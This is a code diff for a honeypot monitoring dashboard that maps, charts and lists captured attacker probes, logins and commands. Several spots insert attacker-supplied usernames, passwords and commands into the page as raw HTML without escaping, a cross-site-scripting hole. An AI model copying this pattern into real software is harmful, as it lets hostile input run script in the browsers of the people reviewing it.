+                options: { responsive: true, maintainAspectRatio: false, plugins: { legend: { position: 'top', labels: { color: '#f0f6fc' } } } }
+            });
+            const ctxTimeline = document.getElementById('timelineChart').getContext('2d');
+            const gradient = ctxTimeline.createLinearGradient(0, 0, 0, 300);
+            gradient.addColorStop(0, 'rgba(31, 111, 235, 0.6)'); gradient.addColorStop(1, 'rgba(31, 111, 235, 0.1)');
+            timelineChart = new Chart(ctxTimeline, {
+                type: 'line', data: { labels: [], datasets: [{ label: 'Events per Minute', data: [], borderColor: '#1f6feb', backgroundColor: gradient, borderWidth: 2, fill: true, tension: 0.4, pointRadius: 3, pointBackgroundColor: '#1f6feb', }] },
+                options: { responsive: true, maintainAspectRatio: false, scales: { y: { beginAtZero: true, ticks: { color: '#8b949e' }, grid: { color: '#30363d', drawBorder: false } }, x: { ticks: { color: '#8b949e' }, grid: { display: false } } }, plugins: { legend: { display: false }, tooltip: { backgroundColor: '#161b22', titleColor: '#c9d1d9', bodyColor: '#c9d1d9' } } }
+            });
+        }
+
+        function processTimelineData(logs) {
+            const attackCounts = {}; const now = new Date();
+            for (let i = 9; i >= 0; i--) { const minute = new Date(now.getTime() - i * 60000); const label = minute.toLocaleTimeString('en-US', { hour: '2-digit', minute: '2-digit' }); attackCounts[label] = 0; }
+            logs.forEach(log => { const logTime = new Date(log.timestamp); const diffInMinutes = Math.floor((now - logTime) / 60000); if (diffInMinutes >= 0 && diffInMinutes < 10) { const label = new Date(now.getTime() - diffInMinutes * 60000).toLocaleTimeString('en-US', { hour: '2-digit', minute: '2-digit' }); attackCounts[label]++; } });
+            return { labels: Object.keys(attackCounts), data: Object.values(attackCounts) };
+        }
+
+        async function fetchData() {
+            try {
+                const limit = document.getElementById('limit-select').value;
+                const [logsResponse, analysisResponse] = await Promise.all([
+                    fetch(`${API_URL}?limit=${limit}`),
+                    fetch(ANALYSIS_URL)
+                ]);
+                
+                if (!logsResponse.ok) throw new Error(`Logs API error! status: ${logsResponse.status}`);
+                if (!analysisResponse.ok) throw new Error(`Analysis API error! status: ${analysisResponse.status}`);
+
+                allLogs = await logsResponse.json();
+                const analysisData = await analysisResponse.json();
+                
+                window.globalAnalysis = analysisData;
+                
+                updateDashboard();
+            } catch (error) {
+                console.error("Could not fetch data:", error);
+                document.getElementById('live-feed').innerHTML = '<div class="log-entry">> ERROR: DATA STREAM UNREACHABLE.</div>';
+            }
+        }
+
+        function updateDashboard() {
+            const filterText = document.getElementById('search-input').value.toLowerCase().trim();
+            const filteredLogs = allLogs.filter(log => 
+                log.source_ip.includes(filterText) || 
+                log.event_type.includes(filterText)
+            );
+
+            // --- FIX: Determine a consistent country for IP filtering ---
+            let filteredIpCountry = null;
+            if (isIpAddress(filterText)) {
+                // Special case for localhost
+                if (filterText === '127.0.0.1' || filterText === 'localhost') {
+                    filteredIpCountry = 'India';
+                } else {
+                    // Find the first log for this IP that has a country
+                    for (const log of allLogs) {
+                        if (log.source_ip === filterText && log.country) {
+                            filteredIpCountry = log.country;
+                            break; // Stop after finding the first one
+                        }
+                    }
+                    // If no country is found in any log for this IP, default to 'N/A'
+                    if (!filteredIpCountry) {
+                        filteredIpCountry = 'N/A';
+                    }
+                }
+            }
+            // --- END FIX ---
+
+            map.eachLayer(layer => { if (layer instanceof L.Marker) map.removeLayer(layer); });
+            filteredLogs.forEach(log => {
+                let lat = log.lat;
+                let lon = log.lon;
+                if (log.source_ip === '127.0.0.1') {
+                    lat = 28.6139; // New Delhi
+                    lon = 77.2090;
+                }
+
+                if (lat && lon) {
+                    // Use the determined country for the popup
+                    const displayCountry = filteredIpCountry || log.country || 'N/A';
+                    L.marker([lat, lon]).addTo(map)
+                        .bindPopup(`<b>${log.source_ip}</b><br>Country: ${displayCountry}<br>Event: ${log.event_type}`);
+                }
+            });
+
+            if (isIpAddress(filterText) && filteredLogs.length > 0) {
+                document.getElementById('analysis-scope').textContent = `(IP: ${filterText})`;
+                const ipLogs = allLogs.filter(log => log.source_ip === filterText);
+                
+                document.getElementById('total-attacks').textContent = ipLogs.length;
+                document.getElementById('unique-ips').textContent = 1;
+                document.getElementById('top-attacker').textContent = filterText;
+                document.getElementById('top-country').textContent = filteredIpCountry; // Use the consistent country
+
+                const commands = ipLogs.filter(log => log.event_type === 'command_executed').map(log => JSON.parse(log.details).command);
+                const commandCounts = {};
+                commands.forEach(cmd => commandCounts[cmd] = (commandCounts[cmd] || 0) + 1);
+                const topCommand = Object.keys(commandCounts).reduce((a, b) => commandCounts[a] > commandCounts[b] ? a : b, '-');
+                document.getElementById('common-command').textContent = topCommand;
+
+                const eventCounts = { 'web_probe': 0, 'web_login_attempt': 0, 'connection_established': 0, 'login_attempt': 0, 'command_executed': 0 };
+                ipLogs.forEach(log => {
+                    if (log && log.event_type && eventCounts.hasOwnProperty(log.event_type)) {
+                        eventCounts[log.event_type]++;
+                    }
+                });
+
+                const eventListHtml = Object.entries(eventCounts)
+                    .filter(([type, count]) => count > 0)
+                    .sort((a,b) => b[1] - a[1])
+                    .map(([type, count]) => `<li><span class="event-name">${type.replace('_', ' ')}</span><span class="event-count">${count}</span></li>`)
+                    .join('');
+                document.getElementById('event-list').innerHTML = eventListHtml || '<li><span class="event-name">No specific events found</span><span class="event-count">0</span></li>';
+                document.getElementById('ip-specific-events').style.display = 'block';
+
+                // Show terminal output section and populate it
+                document.getElementById('terminal-scope').textContent = `(IP: ${filterText})`;
+                document.getElementById('terminal-output-section').style.display = 'block';
+                
+                const terminalOutput = document.getElementById('terminal-output');
+                terminalOutput.innerHTML = '';
+                
+                // Get command execution logs for this IP
+                const commandLogs = ipLogs.filter(log => log.event_type === 'command_executed');
+                
+                if (commandLogs.length > 0) {
+                    commandLogs.forEach(log => {
+                        const details = JSON.parse(log.details);
+                        const command = details.command || 'N/A';
+                        const output = getCommandOutput(command);
+                        const category = categorizeCommand(command);
+                        
+                        const commandDiv = document.createElement('div');
+                        commandDiv.className = 'command-line';
+                        commandDiv.innerHTML = `<span class="command-category">[${category}]</span> $ ${command}`;
+                        
+                        const outputDiv = document.createElement('div');
+                        outputDiv.className = 'command-output';
+                        outputDiv.textContent = output;
+                        
+                        terminalOutput.appendChild(commandDiv);
+                        terminalOutput.appendChild(outputDiv);
+                    });
+                } else {
+                    terminalOutput.innerHTML = '<div>No command executions found for this IP.</div>';
+                }
+
+            } else {
+                document.getElementById('analysis-scope').textContent = '';
+                const analysisData = window.globalAnalysis || {};
+                
+                document.getElementById('total-attacks').textContent = analysisData.total_events || 0;
+                document.getElementById('unique-ips').textContent = analysisData.unique_sources || 0;
+                document.getElementById('top-attacker').textContent = analysisData.top_source_ip || '-';
+                document.getElementById('top-country').textContent = analysisData.top_source_country || '-';
+                document.getElementById('common-command').textContent = analysisData.most_common_command || '-';
+                
+                document.getElementById('ip-specific-events').style.display = 'none';
+                document.getElementById('terminal-output-section').style.display = 'none';
+            }
+
+            const eventCounts = { 'web_probe': 0, 'web_login_attempt': 0, 'connection_established': 0, 'login_attempt': 0, 'command_executed': 0 };
+            filteredLogs.forEach(log => {
+                if (log && log.event_type && eventCounts.hasOwnProperty(log.event_type)) {
+                    eventCounts[log.event_type]++;
+                }
+            });
+            eventTypeChart.data.datasets[0].data = [eventCounts.web_probe, eventCounts.web_login_attempt, eventCounts.connection_established, eventCounts.login_attempt, eventCounts.command_executed];
+            eventTypeChart.update('none'); 
+
+            const timelineData = processTimelineData(filteredLogs);
+            timelineChart.data.labels = timelineData.labels;
+            timelineChart.data.datasets[0].data = timelineData.data;
+            timelineChart.update('none');
+
+            const feedElement = document.getElementById('live-feed');
+            feedElement.innerHTML = '';
+            if (filteredLogs.length === 0) { feedElement.innerHTML = '<div class="log-entry">> NO DATA FOUND.</div>'; return; }
+            
+            filteredLogs.reverse().forEach(log => {
+                const entry = document.createElement('div');
+                entry.className = `log-entry ${log.event_type}`;
+                const details = JSON.parse(log.details);
+                
+                // Always include country information in the event stream
+                const displayCountry = log.country || 'N/A';
+
+                let content = `> [${formatDateTime(log.timestamp)}] ${log.event_type.toUpperCase().replace('_', ' ')} | ${log.source_ip} | ${displayCountry}`;
+                
+                if (log.event_type === 'web_login_attempt' && details.username) {
+                    content += ` | USER: "${details.username}"`;
+                    if (details.password) {
+                        content += ` | PASS: "${details.password}"`;
+                    }
+                    content += ` | STATUS: ${details.status}`;
+                } else if (log.event_type === 'login_attempt' && details.username) {
+                    content += ` | USER: "${details.username}"`;
+                    if (details.password) {
+                        content += ` | PASS: "${details.password}"`;
+                    }
+                } else if (log.event_type === 'command_executed' && details.command) {
+                    content += ` | CMD: "${details.command}"`;
+                }
+                entry.innerHTML = content;
+                feedElement.appendChild(entry);
+            });
+        }
+        
+        function clearFilter() {
+            document.getElementById('search-input').value = '';
+            updateDashboard();
+        }
+
+        document.addEventListener('DOMContentLoaded', () => {
+            initMap(); initCharts(); fetchData();
+            setInterval(fetchData, 5000);
+            document.getElementById('search-input').addEventListener('keyup', updateDashboard);
+            document.getElementById('limit-select').addEventListener('change', fetchData);
+        });
+    </script>
+</body>
+</html>
